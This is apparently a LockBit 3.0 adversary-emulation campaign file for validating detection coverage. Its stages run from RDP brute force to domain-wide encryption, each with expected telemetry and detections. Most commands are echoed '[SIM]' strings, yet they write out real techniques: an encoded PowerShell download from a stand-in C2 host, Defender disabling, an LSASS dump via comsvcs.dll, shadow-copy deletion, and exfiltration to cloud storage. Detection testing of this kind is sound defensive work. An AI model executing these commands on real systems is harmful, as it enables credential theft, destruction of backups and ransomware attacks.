api_version: v1
kind: Campaign

meta:
  name: lockbit-ransomware
  adversary: LockBit
  description: "LockBit 3.0 ransomware-as-a-service operation — double extortion with data theft, service disruption, shadow copy deletion, and mass encryption via group policy deployment"
  objective: "Validate detection coverage across the full ransomware kill chain from initial RDP access through encryption and ransom note deployment"
  mitre_version: "15.1"
  severity: critical
  tags: [ransomware, raas, lockbit, double-extortion, financial]
  authors: ["ThreatEcho"]
  references:
    - https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a
    - https://attack.mitre.org/software/S0690/
  created: "2024-09-05"
  modified: "2025-08-25"

variables:
  target_domain: "corp.local"
  dc_host: "DC01"
  c2_server: "203.0.113.42"
  c2_port: "443"
  exfil_endpoint: "https://mega.nz/upload"
  ransom_note: "README-LOCKBIT.txt"

stages:
  - id: initial-access-rdp
    name: Exposed RDP Brute Force
    description: "LockBit affiliates gain initial access via brute-forcing exposed RDP services — the most common LockBit entry vector per CISA AA23-165A"
    technique: T1110.003
    tactic: credential-access
    platform: [windows]
    execute:
      type: shell
      commands:
        - 'echo "[SIM] Password spraying against RDP service on 203.0.113.10:3389"'
        - 'echo "[SIM] Valid credentials found — domain\\svc-backup:Summer2024!"'
        - 'echo "[SIM] RDP session established to initial foothold host"'
    expect:
      telemetry: [network_connection, authentication, logon_event]
      detections: [rdp_brute_force_detected, multiple_failed_logons, suspicious_rdp_source]
    on_success: powershell-payload
    on_failure: abort
    timeout: 120s

  - id: powershell-payload
    name: PowerShell Stager Execution
    description: "Download and execute LockBit stager via PowerShell — affiliates typically use encoded commands to evade command-line logging"
    technique: T1059.001
    tactic: execution
    platform: [windows]
    depends_on: [initial-access-rdp]
    execute:
      type: shell
      commands:
        - 'echo "[SIM] powershell.exe -nop -w hidden -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAA..."'
        - 'echo "[SIM] LockBit stager downloaded from {{c2_server}} and loaded into memory"'
    expect:
      telemetry: [process_create, script_execution, network_connection]
      detections: [powershell_encoded_command, powershell_download_cradle, suspicious_powershell_execution]
    on_success: disable-defenses
    on_failure: abort
    timeout: 60s

  - id: disable-defenses
    name: Disable Security Tools
    description: "Disable Windows Defender and tamper with EDR services — LockBit operators systematically neutralize security tooling before encryption"
    technique: T1562.001
    tactic: defense-evasion
    platform: [windows]
    depends_on: [powershell-payload]
    execute:
      type: shell
      commands:
        - 'echo "[SIM] Set-MpPreference -DisableRealtimeMonitoring $true"'
        - 'echo "[SIM] sc config WinDefend start=disabled"'
        - 'echo "[SIM] reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender /v DisableAntiSpyware /t REG_DWORD /d 1 /f"'
        - 'echo "[SIM] Terminating EDR agent processes"'
      elevated: true
    expect:
      telemetry: [process_create, registry_set, script_execution]
      detections: [defender_disabled, edr_tampering_detected, security_tool_modification]
    on_success: credential-dump
    on_failure: continue
    timeout: 60s

  - id: credential-dump
    name: LSASS Credential Dumping
    description: "Dump credentials from LSASS via comsvcs.dll MiniDump — standard LockBit affiliate technique for harvesting domain admin credentials"
    technique: T1003.001
    tactic: credential-access
    platform: [windows]
    depends_on: [disable-defenses]
    execute:
      type: shell
      commands:
        - 'echo "[SIM] rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\\Windows\\Temp\\debug.bin full"'
        - 'echo "[SIM] Domain admin credentials extracted from memory dump"'
      elevated: true
      cleanup:
        - 'echo "[SIM] del /f /q C:\\Windows\\Temp\\debug.bin"'
    expect:
      telemetry: [process_create, process_access, file_create]
      detections: [lsass_memory_access, credential_dumping_via_comsvcs, suspicious_minidump]
      artifacts: ["C:\\Windows\\Temp\\debug.bin"]
    on_success: domain-recon
    on_failure: continue
    timeout: 45s

  - id: domain-recon
    name: Domain Reconnaissance
    description: "Enumerate domain structure to identify high-value targets — domain controllers, file servers, backup servers, SQL instances"
    technique: T1087.002
    tactic: discovery
    platform: [windows]
    depends_on: [credential-dump]
    execute:
      type: shell
      commands:
        - 'echo "[SIM] net group \"Domain Admins\" /domain"'
        - 'echo "[SIM] net group \"Domain Controllers\" /domain"'
        - 'echo "[SIM] nltest /dclist:{{target_domain}}"'
        - 'echo "[SIM] net view /domain:{{target_domain}}"'
      elevated: false
    expect:
      telemetry: [process_create]
      detections: [domain_enumeration_commands, suspicious_ad_enumeration, recon_command_sequence]
    on_success: lateral-movement-rdp
    on_failure: continue
    timeout: 30s

  - id: lateral-movement-rdp
    name: RDP Lateral Movement to Domain Controller
    description: "Move laterally to the domain controller via RDP using harvested domain admin credentials — LockBit affiliates prefer RDP for interactive access"
    technique: T1021.001
    tactic: lateral-movement
    platform: [windows]
    depends_on: [domain-recon]
    execute:
      type: shell
      commands:
        - 'echo "[SIM] mstsc /v:{{dc_host}}.{{target_domain}} — authenticating as {{target_domain}}\\domain-admin"'
        - 'echo "[SIM] Interactive RDP session on domain controller established"'
    expect:
      telemetry: [network_connection, logon_event, authentication]
      detections: [rdp_lateral_movement, admin_logon_to_dc, unusual_rdp_source]
    on_success: c2-establish
    on_failure: abort
    timeout: 60s

  - id: c2-establish
    name: HTTPS Command and Control
    description: "Establish persistent C2 channel over HTTPS from domain controller — provides operator access for data staging and encryption deployment"
    technique: T1071.001
    tactic: command-and-control
    platform: [windows]
    depends_on: [lateral-movement-rdp]
    execute:
      type: http
      target: "https://{{c2_server}}:{{c2_port}}/api/beacon"
    expect:
      telemetry: [network_connection, dns_query, tls_handshake]
      detections: [c2_beacon_pattern, suspicious_outbound_from_dc, anomalous_dc_network_activity]
      iocs: ["{{c2_server}}"]
    on_success: data-collection
    on_failure: continue
    timeout: 120s

  - id: data-collection
    name: Data Collection and Staging
    description: "Collect sensitive documents and database exports for double extortion — LockBit exfiltrates data before encryption to maximize leverage"
    technique: T1074.001
    tactic: collection
    platform: [windows]
    depends_on: [c2-establish]
    execute:
      type: shell
      commands:
        - 'echo "[SIM] Enumerating file shares: dir /s /b \\\\{{dc_host}}\\SYSVOL\\*.* > share_listing.txt"'
        - 'echo "[SIM] Staging financial records, HR data, and customer databases to C:\\Windows\\Temp\\exfil\\"'
        - 'echo "[SIM] 7z a -p\"LB3_key\" C:\\Windows\\Temp\\exfil\\data.7z @filelist.txt"'
    expect:
      telemetry: [file_read, file_create, process_create]
      detections: [mass_file_access, data_staging_detected, suspicious_archive_creation]
      artifacts: ["C:\\Windows\\Temp\\exfil\\"]
    on_success: data-exfiltration
    on_failure: continue
    timeout: 120s

  - id: data-exfiltration
    name: Data Exfiltration for Double Extortion
    description: "Exfiltrate staged data to attacker-controlled cloud storage — the theft component of LockBit double extortion"
    technique: T1567.002
    tactic: exfiltration
    platform: [windows]
    depends_on: [data-collection]
    execute:
      type: http
      target: "{{exfil_endpoint}}"
    expect:
      telemetry: [network_connection, dns_query, file_read]
      detections: [large_outbound_transfer, exfiltration_to_cloud, data_exfil_from_dc]
      iocs: ["{{exfil_endpoint}}"]
    on_success: inhibit-recovery
    on_failure: continue
    timeout: 300s

  - id: inhibit-recovery
    name: Delete Shadow Copies and Disable Recovery
    description: "Delete volume shadow copies and disable Windows recovery — LockBit ensures no local backup recovery is possible before encryption begins"
    technique: T1490
    tactic: impact
    platform: [windows]
    depends_on: [data-exfiltration]
    execute:
      type: shell
      commands:
        - 'echo "[SIM] vssadmin delete shadows /all /quiet"'
        - 'echo "[SIM] wmic shadowcopy delete"'
        - 'echo "[SIM] bcdedit /set {default} recoveryenabled No"'
        - 'echo "[SIM] bcdedit /set {default} bootstatuspolicy ignoreallfailures"'
      elevated: true
    expect:
      telemetry: [process_create, file_delete]
      detections: [shadow_copy_deletion, vssadmin_abuse, recovery_disabled, bcdedit_modification]
    on_success: stop-services
    on_failure: continue
    timeout: 60s

  - id: stop-services
    name: Stop Critical Services
    description: "Stop backup agents, SQL Server, Exchange, and other services that hold file locks — required for LockBit to encrypt database files and mailboxes"
    technique: T1489
    tactic: impact
    platform: [windows]
    depends_on: [inhibit-recovery]
    execute:
      type: shell
      commands:
        - 'echo "[SIM] net stop vss"'
        - 'echo "[SIM] net stop MSSQLSERVER"'
        - 'echo "[SIM] net stop MSExchangeIS"'
        - 'echo "[SIM] net stop \"Veeam Backup Service\""'
        - 'echo "[SIM] taskkill /f /im sqlservr.exe"'
      elevated: true
    expect:
      telemetry: [process_create]
      detections: [critical_service_stopped, backup_service_terminated, mass_service_stop]
    on_success: deploy-ransomware
    on_failure: continue
    timeout: 45s

  - id: deploy-ransomware
    name: Ransomware Encryption Deployment
    description: "Deploy LockBit 3.0 encryptor across domain via PsExec and group policy — mass encryption of all reachable endpoints with ransom note dropped in every directory"
    technique: T1486
    tactic: impact
    platform: [windows]
    depends_on: [stop-services]
    execute:
      type: shell
      commands:
        - 'echo "[SIM] Deploying LockBit3.exe via GPO: xcopy LockBit3.exe \\\\{{dc_host}}\\SYSVOL\\{{target_domain}}\\scripts\\"'
        - 'echo "[SIM] Creating immediate scheduled task via GPO for domain-wide execution"'
        - 'echo "[SIM] LockBit3.exe encrypting files with .lockbit extension"'
        - 'echo "[SIM] Dropping {{ransom_note}} in every directory with encrypted files"'
      elevated: true
    expect:
      telemetry: [process_create, file_create, file_modify, scheduled_task_create]
      detections: [ransomware_file_encryption, mass_file_rename, ransom_note_creation, gpo_abuse_detected, rapid_file_modification]
      artifacts: ["{{ransom_note}}"]
    on_failure: abort
    timeout: 600s
